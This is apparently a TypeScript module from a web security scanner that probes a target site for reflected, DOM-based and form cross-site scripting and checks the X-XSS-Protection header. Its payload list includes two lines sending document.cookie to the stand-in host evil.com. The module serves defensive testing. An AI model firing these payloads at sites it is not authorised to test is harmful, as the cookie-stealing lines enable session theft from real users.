import { BaseTest, TestContext, TestResult } from '../types.js';

export class XSSTests extends BaseTest {
  name = 'XSS Vulnerability Tests';
  category = 'Injection';
  description = 'Tests for Cross-Site Scripting vulnerabilities (Reflected, Stored, DOM-based)';

  private xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<select onfocus=alert("XSS") autofocus>',
    '<textarea onfocus=alert("XSS") autofocus>',
    '<keygen onfocus=alert("XSS") autofocus>',
    '<video><source onerror="alert(\'XSS\')">',
    '<audio src=x onerror=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
    '\'"><img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '<script>fetch("http://evil.com?cookie="+document.cookie)</script>',
    '{{7*7}}', // Template injection
    '${7*7}', // Template injection
    '<script>document.location="http://evil.com?c="+document.cookie</script>',
  ];

  async run(context: TestContext): Promise<TestResult[]> {
    const results: TestResult[] = [];

    // Test 1: Reflected XSS in URL parameters
    results.push(...await this.testReflectedXSS(context));

    // Test 2: DOM-based XSS
    results.push(...await this.testDOMBasedXSS(context));

    // Test 3: XSS in forms
    results.push(...await this.testFormXSS(context));

    // Test 4: Script injection in headers/cookies
    results.push(...await this.testHeaderXSS(context));

    return results;
  }

  private async testReflectedXSS(context: TestContext): Promise<TestResult[]> {
    const results: TestResult[] = [];
    const { page, baseUrl } = context;

    for (const payload of this.xssPayloads.slice(0, 5)) {
      try {
        const testUrl = `${baseUrl}?q=${encodeURIComponent(payload)}`;

        // Set up dialog handler before navigation
        let dialogDetected = false;
        page.once('dialog', async dialog => {
          dialogDetected = true;
          await dialog.dismiss();
        });

        await page.goto(testUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });

        // Check if payload is reflected in HTML
        const content = await page.content();
        const isReflected = content.includes(payload) || content.includes(payload.replace(/"/g, '&quot;'));

        if (dialogDetected || isReflected) {
          results.push(
            this.createResult(
              'Reflected XSS',
              this.category,
              'high',
              true,
              `Potential reflected XSS vulnerability detected with payload: ${payload}`,
              [testUrl, `Dialog triggered: ${dialogDetected}`, `Payload reflected: ${isReflected}`],
              'Implement proper input validation and output encoding. Use Content Security Policy (CSP).',
              { payload, url: testUrl }
            )
          );
          break; // Found vulnerability, no need to test more
        }
      } catch (error) {
        // Ignore errors, continue testing
      }
    }

    if (results.length === 0) {
      results.push(
        this.createResult(
          'Reflected XSS',
          this.category,
          'info',
          false,
          'No reflected XSS vulnerabilities detected in URL parameters',
          [],
          undefined,
          { testedPayloads: this.xssPayloads.slice(0, 5).length }
        )
      );
    }

    return results;
  }

  private async testDOMBasedXSS(context: TestContext): Promise<TestResult[]> {
    const results: TestResult[] = [];
    const { page, baseUrl } = context;

    try {
      await page.goto(baseUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });

      // Check for dangerous DOM sinks
      const dangerousSinks = await page.evaluate(() => {
        const findings: string[] = [];
        const scripts = Array.from(document.getElementsByTagName('script'));

        const dangerousPatterns = [
          /\.innerHTML\s*=/,
          /\.outerHTML\s*=/,
          /document\.write\(/,
          /document\.writeln\(/,
          /eval\(/,
          /setTimeout\(.+location/,
          /setInterval\(.+location/,
          /\.location\s*=/,
          /\.href\s*=.*location/,
        ];

        scripts.forEach((script, index) => {
          const content = script.textContent || '';
          dangerousPatterns.forEach(pattern => {
            if (pattern.test(content)) {
              findings.push(`Script ${index}: ${pattern.toString()}`);
            }
          });
        });

        return findings;
      });

      if (dangerousSinks.length > 0) {
        results.push(
          this.createResult(
            'DOM-based XSS Risk',
            this.category,
            'medium',
            true,
            'Potentially dangerous DOM manipulation patterns detected',
            dangerousSinks,
            'Review JavaScript code for unsafe DOM manipulation. Use safe APIs like textContent instead of innerHTML.',
            { sinks: dangerousSinks }
          )
        );
      } else {
        results.push(
          this.createResult(
            'DOM-based XSS Risk',
            this.category,
            'info',
            false,
            'No obvious DOM-based XSS patterns detected',
            []
          )
        );
      }
    } catch (error) {
      results.push(
        this.createResult(
          'DOM-based XSS Risk',
          this.category,
          'info',
          false,
          `Could not analyze DOM: ${error}`,
          []
        )
      );
    }

    return results;
  }

  private async testFormXSS(context: TestContext): Promise<TestResult[]> {
    const results: TestResult[] = [];
    const { page, baseUrl, discoveredInputs } = context;

    try {
      // Use discovered inputs from crawler if available
      if (discoveredInputs && discoveredInputs.length > 0) {
        console.log(`    Testing ${Math.min(discoveredInputs.length, 10)} discovered input fields`);

        // Group inputs by URL
        const inputsByUrl = new Map<string, typeof discoveredInputs>();
        discoveredInputs.forEach(input => {
          if (!inputsByUrl.has(input.url)) {
            inputsByUrl.set(input.url, []);
          }
          inputsByUrl.get(input.url)!.push(input);
        });

        // Test inputs from different pages
        let testedCount = 0;
        for (const [url, inputs] of inputsByUrl) {
          if (testedCount >= 10) break; // Limit to 10 inputs max

          try {
            await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 });

            for (const inputField of inputs.slice(0, 2)) { // Test max 2 per page
              if (testedCount >= 10) break;

              const testPayload = this.xssPayloads[0];

              try {
                let dialogDetected = false;
                page.once('dialog', async dialog => {
                  dialogDetected = true;
                  await dialog.dismiss();
                });

                const element = await page.$(inputField.selector);
                if (element) {
                  await element.fill(testPayload);
                  await element.press('Enter');
                  await page.waitForTimeout(500);

                  const content = await page.content();
                  const isReflected = content.includes(testPayload);

                  if (dialogDetected || isReflected) {
                    results.push(
                      this.createResult(
                        'Form XSS',
                        this.category,
                        'high',
                        true,
                        `XSS vulnerability detected in input field`,
                        [
                          `URL: ${url}`,
                          `Field: ${inputField.name}`,
                          `Dialog triggered: ${dialogDetected}`
                        ],
                        'Implement input validation and output encoding for all form fields.',
                        { payload: testPayload, url, field: inputField.name }
                      )
                    );
                    return results; // Found vulnerability, stop testing
                  }
                  testedCount++;
                }
              } catch (error) {
                // Continue testing other inputs
              }
            }
          } catch (error) {
            // Continue to next URL
          }
        }

        if (results.length === 0) {
          results.push(
            this.createResult(
              'Form XSS',
              this.category,
              'info',
              false,
              `No XSS vulnerabilities detected in ${testedCount} discovered input field(s)`,
              []
            )
          );
        }
        return results;
      }

      // Fallback to original method if no crawler data
      await page.goto(baseUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });

      // Find all input fields
      const inputs = await page.$$('input[type="text"], input[type="search"], textarea');

      if (inputs.length === 0) {
        results.push(
          this.createResult(
            'Form XSS',
            this.category,
            'info',
            false,
            'No text input fields found to test',
            []
          )
        );
        return results;
      }

      // Test first few inputs with XSS payloads
      for (let i = 0; i < Math.min(inputs.length, 3); i++) {
        const input = inputs[i];
        const testPayload = this.xssPayloads[0];

        try {
          let dialogDetected = false;
          page.once('dialog', async dialog => {
            dialogDetected = true;
            await dialog.dismiss();
          });

          await input.fill(testPayload);
          await input.press('Enter');
          await page.waitForTimeout(500);

          const content = await page.content();
          const isReflected = content.includes(testPayload);

          if (dialogDetected || isReflected) {
            results.push(
              this.createResult(
                'Form XSS',
                this.category,
                'high',
                true,
                `XSS vulnerability detected in form input field`,
                [`Input index: ${i}`, `Dialog triggered: ${dialogDetected}`],
                'Implement input validation and output encoding for all form fields.',
                { payload: testPayload }
              )
            );
            break;
          }
        } catch (error) {
          // Continue testing other inputs
        }
      }

      if (results.length === 0) {
        results.push(
          this.createResult(
            'Form XSS',
            this.category,
            'info',
            false,
            `No XSS vulnerabilities detected in ${inputs.length} form input(s)`,
            []
          )
        );
      }
    } catch (error) {
      results.push(
        this.createResult(
          'Form XSS',
          this.category,
          'info',
          false,
          `Could not test form XSS: ${error}`,
          []
        )
      );
    }

    return results;
  }

  private async testHeaderXSS(context: TestContext): Promise<TestResult[]> {
    const results: TestResult[] = [];
    const { page, baseUrl } = context;

    try {
      // Test X-XSS-Protection header
      const response = await page.goto(baseUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });
      const headers = response?.headers() || {};

      const xssProtection = headers['x-xss-protection'];
      if (!xssProtection || xssProtection === '0') {
        results.push(
          this.createResult(
            'XSS Protection Header',
            'Security Misconfiguration',
            'low',
            true,
            'X-XSS-Protection header is missing or disabled',
            [`Header value: ${xssProtection || 'missing'}`],
            'Add X-XSS-Protection: 1; mode=block header (though CSP is more effective).',
            { header: xssProtection }
          )
        );
      } else {
        results.push(
          this.createResult(
            'XSS Protection Header',
            'Security Misconfiguration',
            'info',
            false,
            'X-XSS-Protection header is properly configured',
            [`Header value: ${xssProtection}`]
          )
        );
      }
    } catch (error) {
      results.push(
        this.createResult(
          'XSS Protection Header',
          'Security Misconfiguration',
          'info',
          false,
          `Could not test XSS protection header: ${error}`,
          []
        )
      );
    }

    return results;
  }
}
